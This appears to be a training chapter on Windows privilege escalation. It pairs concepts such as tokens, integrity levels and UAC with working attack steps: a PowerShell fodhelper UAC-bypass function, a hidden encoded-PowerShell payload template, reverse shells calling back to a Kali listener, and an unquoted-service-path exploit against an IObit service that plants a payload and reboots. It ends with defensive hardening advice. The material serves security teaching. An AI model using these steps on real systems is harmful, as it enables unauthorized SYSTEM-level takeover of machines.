# 6. Windows Privilege Escalation

## Overview

Privilege escalation is the stage where an attacker tries to move from a lower-privileged user context to a higher-privileged one.

On Windows, this usually means moving from:

```text
Standard user / Medium integrity
```

to:

```text
Administrator / High integrity
```

and finally to:

```text
NT AUTHORITY\SYSTEM / System integrity
```

Privilege escalation is important because once an attacker has elevated privileges, they can usually do much more damage, such as:

- Dump credentials
- Disable security tools
- Install persistence
- Access sensitive files
- Create users
- Modify services
- Move laterally
- Exfiltrate data

# 6.1 Privilege Escalation Introduction

## Key Concepts

Windows privilege escalation depends on several core concepts:

- Users
- Groups

- Service permissions

---

# Windows Access Tokens

When a user logs in, Windows creates an **access token** for that user.

The access token contains the user’s security context, including:

- User SID
- Group SIDs
- Privileges
- Integrity level
- Logon session information

A process started by that user receives a copy of the user’s token. This token tells Windows what the process is allowed to do.

Simple flow:

```text
User logs in
→ Windows creates token
→ User starts process
→ Process uses token
→ Windows checks token when process accesses resources
```

---

# Security Identifier, SID

A **Security Identifier**, or SID, uniquely identifies a security principal. A Security Identifier (SID) is a unique, immutable value assigned by the Windows operating system to identify security principals like users, user groups, or computers. It is the foundation of Windows access control, ensuring permissions remain intact even if an account's name changes.

**How SIDs Work**

- Immutability: When you create an account, Windows generates a SID. If you rename the account, the SID stays exactly the same.
- Access Control: Windows checks the SID in a user's access token against the system's Access Control Lists (ACLs) to determine what files, folders, and resources they are allowed to access.
- No Recycling: If you delete an account, its SID is permanently destroyed. Creating a new account with the same name will result in a completely new, different SID.

Examples of security principals:

- User account
- Group account
- Computer account
- Service account

Example SID format:

```text
S-1-5-21-1241977418-156118851-1443169900-1001
```

Common well-known SIDs:

```text
S-1-5-18      = LocalSystem
S-1-5-32-544  = Administrators
S-1-1-0       = Everyone
```

# Windows Integrity Levels

Windows uses integrity levels to describe how trusted a process or object is. Windows Integrity Levels (WIL) are core components of Mandatory Integrity Control (MIC) that restrict what processes can and cannot modify. They establish trust boundaries to prevent malicious or vulnerable programs (like web browsers) from compromising sensitive system resources or user data.

**The Four Main Integrity Levels**

Windows defines four primary integrity levels to classify both processes and objects, ranging from least trusted to most trusted:

- Low: For heavily sandboxed processes or internet-facing applications. Example: Certain components of web browsers or downloaded files. Low-integrity processes have highly restricted access and cannot read or write to medium or high-level objects.
- Medium: The default level for standard user accounts and objects that lack a specific integrity label. Even users who are members of the Administrators group operate at the medium level by default until they elevate.
- High: Assigned to processes running with full administrator privileges (UAC elevated). These processes can modify most system files and registry keys.
- System: The highest integrity level, reserved for essential core operating system services, kernel operations, and hardware initialization (like the Local System account

| Integrity Level | Meaning |
|---|---|
| Low | Very restricted, often sandboxed |
| Medium | Normal standard user context |
| High | Elevated administrator context |
| System | SYSTEM-level context |

Simple version:

```text
Low      = sandboxed / restricted
Medium   = normal user
High     = administrator-elevated
System   = NT AUTHORITY\SYSTEM
```


**Related Security Features**

- UAC (User Account Control): Works in tandem with integrity levels to allow administrators to run applications at the medium level by default, prompting for a privilege elevation to "High" only when needed.
- Core Isolation (Memory Integrity): A related Windows virtualization feature that prevents unauthorized/malicious low-level drivers from hijacking high-privilege operations

**UAC and Core Isolation Work Together**

User Account Control (UAC) and Core Isolation protect different layers of the operating system. UAC manages user-space privileges. Core Isolation protects the kernel-space memory.

How UAC Uses Integrity Levels

- UAC acts as the gatekeeper between Medium and High integrity levels.Split Tokens: When an administrator logs in, Windows creates two security tokens: a standard user token (Medium) and an administrator token (High).
- Default State: Applications run using the Medium token to limit potential malware damage.
- The Prompt: Clicking "Run as administrator" triggers the UAC prompt to switch the application to the High-integrity token.

**How Core Isolation Defends the Kernel**

Core Isolation operates below the standard operating system layers using hardware virtualization.

- VBS Protection: Virtualization-Based Security (VBS) creates an isolated memory zone that the standard operating system cannot access.
- Hypervisor Enforcement: Memory Integrity (HVCI) runs inside this secure zone to check all kernel-mode drivers.

## Why Integrity Levels Matter

A user may be part of the local Administrators group, but their normal process may still run at **Medium** integrity.

Example:

```text
User is local admin
PowerShell opens normally
PowerShell runs at Medium integrity
```

If the user opens PowerShell as Administrator:

```text
PowerShell runs at High integrity
```

If the process runs as SYSTEM:

```text
Process runs at System integrity
```

This is why attackers often try to move from:

```text
Medium → High → System
```

# User Account Control, UAC

User Account Control, or UAC, is a Windows feature that helps prevent unauthorized system-wide changes.

Important point:

```text
UAC is not a full security boundary.
```

Simple explanation:

```text
UAC helps prevent accidental or silent admin changes, but it should not be treated as a strong security boundary against malware already running as the user.
```

# Bypassing UAC with fodhelper.exe

## What Is `fodhelper.exe`?

It is a legitimate Microsoft Windows binary.

```text
fodhelper.exe = Features On Demand Helper
```

Default path:

```text
C:\Windows\System32\fodhelper.exe
```

Windows uses it for optional Windows features and settings-related actions.

The reason attackers abuse it is:

```text
fodhelper.exe is trusted by Windows and can auto-elevate.
```

That means when certain conditions are met, Windows can start `fodhelper.exe` with **High integrity** without showing the normal UAC prompt.

---

## Important Concept

The dangerous part is not `fodhelper.exe` itself.

The dangerous part is this combination:

```text
Legitimate auto-elevating Windows binary
+
User-writable registry key
+
Attacker-controlled command
=
UAC bypass
```

Short version:

```text
fodhelper.exe is legitimate.
The attacker abuses how it reads registry keys.
```

---

## What Is UAC Bypass Here?

UAC bypass with fodhelper does **not** mean:

```text
Normal user → Administrator
```

It means:

```text
Local administrator running at Medium integrity
→ High integrity without clicking the UAC prompt
```

So the current user normally must already be a member of the local Administrators group.

The bypass moves the process from:

```text
Medium integrity
```

to:

```text
High integrity
```

It does **not directly give SYSTEM**.

---

## Basic Fodhelper UAC Bypass Idea

The attack abuses registry keys under the current user hive.

Common registry path:

```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

`HKCU` means:

```text
HKEY_CURRENT_USER
```

In Sysmon, the same location may appear in a longer SID-based form:

```text
HKU\<SID>_Classes\ms-settings\Shell\Open\command
```

Example:

```text
HKU\S-1-5-21-1241977418-156118851-1443169900-1001_Classes\ms-settings\Shell\Open\command
```

These two forms refer to the same per-user registry area:

```text
HKCU\Software\Classes\...
```

and:

```text
HKU\<User-SID>_Classes\...
```

---

## Registry Values Used

The attacker sets:

```text
(Default)        = command to execute
DelegateExecute = empty value
```

Example:

```text
HKCU\Software\Classes\ms-settings\Shell\Open\command\(Default)
```

contains something like:

```text
powershell.exe -NoP -NonI -W Hidden -enc <encoded payload>
```

And:

```text
HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute
```

is created with an empty value.

Then the attacker starts:

```text
C:\Windows\System32\fodhelper.exe
```

Because `fodhelper.exe` auto-elevates, it can execute the command from the registry with **High integrity**.

Rapid7’s Metasploit documentation describes the same idea: the module hijacks a special registry key under the current user hive, inserts a custom command, and that command is invoked when `fodhelper.exe` launches. It also notes that the module spawns a second shell with the UAC flag turned off and cleans up the registry key after payload invocation. :contentReference[oaicite:0]{index=0}

---

## Fodhelper Attack Chain

```text
PowerShell runs as the current user
→ Script creates/modifies HKCU ms-settings registry keys
→ Script writes the payload command into the registry
→ Script starts fodhelper.exe
→ fodhelper.exe auto-elevates
→ fodhelper.exe reads the hijacked registry key
→ fodhelper.exe starts elevated PowerShell or another payload
→ Payload runs with High integrity
→ If the payload is a reverse shell, it connects back to the attacker
```

---

## Very Important: Reverse shell

If the idea is to get back a reverse shell to our Kali linux machine, we can create a payload which by running it, connect back to our Kali linux which is in listening mode.

The Kali IP goes into the **payload**.

Think of it like this:

```text
fodhelper.exe = UAC bypass trigger
payload       = what gets executed after elevation
listener      = where the payload connects back
```

So:

```text
fodhelper.exe does not know the Kali IP.
The payload knows the Kali IP.
```

If the payload is an EXE reverse shell, the IP and port are usually embedded when the payload is generated.

If the payload is a PowerShell reverse shell, the IP and port are inside the PowerShell command or inside a PowerShell script.

Example concept:

```text
Kali listener:
192.168.51.50:443

Windows payload:
connect back to 192.168.51.50:443
```

If these do not match, no reverse shell will connect back.

---

## Manual Script Example Concept

A simple fodhelper bypass script often looks like this:

```powershell
function FodhelperBypass {
    Param (
        [String]$program = "cmd /c start powershell.exe"
    )

    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
```

The important variable is:

```powershell
$program
```

That is the command that will run elevated.

Example harmless test:

```powershell
FodhelperBypass -program "notepad.exe"
```

Example with a payload file:

```powershell
FodhelperBypass -program "C:\Users\Public\payload.exe"
```

In this case:

```text
payload.exe contains the reverse-shell IP and port.
fodhelper only starts payload.exe with High integrity.
```

## Named Pipe Impersonation Concept

Think of Named Pipe Impersonation as a trick where Meterpreter makes a communication channel, then convinces a SYSTEM process to connect to it, and then “borrows” that SYSTEM identity. So if a SYSTEM service connects to a pipe controlled by Meterpreter, Meterpreter may be able to impersonate that connecting SYSTEM client.

Basic idea:

```text
Meterpreter creates named pipe
→ Temporary Windows service is created
→ Service runs as LocalSystem
→ Service connects to named pipe
→ Meterpreter impersonates SYSTEM token
→ Meterpreter becomes SYSTEM
```

Impersonation means: A process temporarily acts using another security token.

# Technique 2: Attacking Service Permissions

## Concept

Some Windows services have weak permissions.

If a normal authenticated user can modify the service configuration, the attacker can change the service binary path to a malicious executable.

If the service runs as LocalSystem, the malicious executable runs as SYSTEM.

Attack chain:

```text
Find modifiable service
→ Change service binpath
→ Start/restart service
→ Malicious binary runs as SYSTEM
→ Reverse shell connects back
```

# Technique 3: Leveraging Unquoted Service Paths

## What Is an Unquoted Service Path?

A service binary path is vulnerable when:

1. The path contains spaces.
2. The path is not wrapped in quotes.
3. The attacker can write to one of the interpreted directories.
4. The service runs with high privileges, often SYSTEM.

Example vulnerable path:

```text
C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
```

Correct secure version:

```text
"C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe"
```

---

## Why Spaces Matter

If Windows sees this unquoted path:

```text
C:\Program Files\My Program\My Service\service.exe
```

It may try these paths in order:

```text
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My Service\service.exe
```

If the attacker can place a malicious executable at one of the earlier locations, Windows may execute it first.

---

## example: Vulnerable Service: IOBitUnSvr

Service name:

```text
IOBitUnSvr
```

Display name:

```text
IObit Uninstaller Service
```

Binary path:

```text
C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
```

Runs as:

```text
LocalSystem
```

Startup type:

```text
AUTO_START
```

Writable directory:

```text
C:\Program Files (x86)\IObit
```

---

## Find Unquoted Services with PowerUp

Import:

```powershell
Import-Module .\PowerUp.ps1
```

Run:

```powershell
Get-UnquotedService
```

Example output:

```text
ServiceName: IOBitUnSvr
Path: C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath: C:\Program Files (x86)\IObit
StartName: LocalSystem
```

---

## Confirm with sc.exe

```powershell
sc.exe qc IOBitUnSvr
```

Look for:

```text
BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
SERVICE_START_NAME : LocalSystem
```

If no quotes are present, it is vulnerable.

---

## Exploiting the IOBit Unquoted Path

Copy payload:

```powershell
copy .\servshell_443.exe 'C:\Program Files (x86)\IObit\IOBit.exe'
```

The copy command copies the payload servshell_443.exe into the writable IObit directory and renames it to IOBit.exe. This filename is chosen because Windows may execute it first when parsing the unquoted service path. When the vulnerable service starts, IOBit.exe runs instead of the real service executable, and because the service runs as LocalSystem, the payload runs as SYSTEM.

PowerShell alias note:

```text
copy = Copy-Item
```

You can confirm:

```powershell
Get-Alias copy
```

Expected cmdlet:

```text
Copy-Item
```

---

## Why IOBit.exe?

Original path:

```text
C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
```

Windows can interpret it like:

```text
C:\Program.exe
C:\Program Files (x86)\IObit\IObit.exe
C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
```

Since attacker can write to:

```text
C:\Program Files (x86)\IObit
```

the best payload filename is:

```text
IOBit.exe
```

---

## Reboot to Trigger Auto-Start Service

Because the service is auto-start and cannot be restarted manually:

```powershell
shutdown -r -t 0
```

After reboot, the service starts and Windows executes the malicious payload.

Confirm:

```text
getuid
```

Expected output:

```text
Server username: NT AUTHORITY\SYSTEM
```

Integrity level:

```text
System
```

# Defensive Recommendations

## Reduce Privilege Escalation Risk

Defenders should:

- Remove unnecessary local admin rights
- Patch Windows and third-party software
- Audit service permissions
- Quote all service binary paths
- Remove writable permissions from service directories
- Monitor service creation and service configuration changes
- Enable Sysmon
- Enable PowerShell logging
- Forward logs to centralized storage
- Monitor suspicious parent/child process chains
- Alert on encoded PowerShell
- Alert on LOLBins used for privilege escalation
- Review UAC bypass indicators

---

## Service Hardening

For services:

```text
Only Administrators and SYSTEM should modify service configuration.
```

Avoid granting dangerous rights to normal users:

```text
SERVICE_CHANGE_CONFIG
SERVICE_START
SERVICE_STOP
SERVICE_ALL_ACCESS
```

Also avoid writable permissions in service directories, especially:

```text
C:\Program Files
C:\Program Files (x86)
```

---

## Secure Service Paths

Bad:

```text
C:\Program Files\Vendor App\Service Folder\service.exe
```

Good:

```text
"C:\Program Files\Vendor App\Service Folder\service.exe"
```

All service paths containing spaces should be quoted.

# Key Takeaways

- Privilege escalation on Windows often depends on misconfigurations.
- Access tokens define a user or process security context.
- Integrity levels help determine what a process can do.
- Medium integrity is normal user level.
- High integrity is elevated administrator level.
- System integrity is NT AUTHORITY\SYSTEM.
- UAC is useful, but it is not a full security boundary.
- Fodhelper UAC bypass can elevate a local admin from Medium to High.
- Sysmon Event ID 13 is important for registry-based UAC bypass detection.
- Meterpreter `getsystem` can create a temporary service and use named pipe impersonation.
- Security Event ID 4697 detects service installation.
- Weak service permissions can allow users to replace the service binary path.
- Unquoted service paths can execute attacker-controlled files from writable parent directories.
- Service abuse often leads to SYSTEM because many services run as LocalSystem.
- Strong detection requires correlating Sysmon, Security logs, PowerShell logs, and service configuration changes.
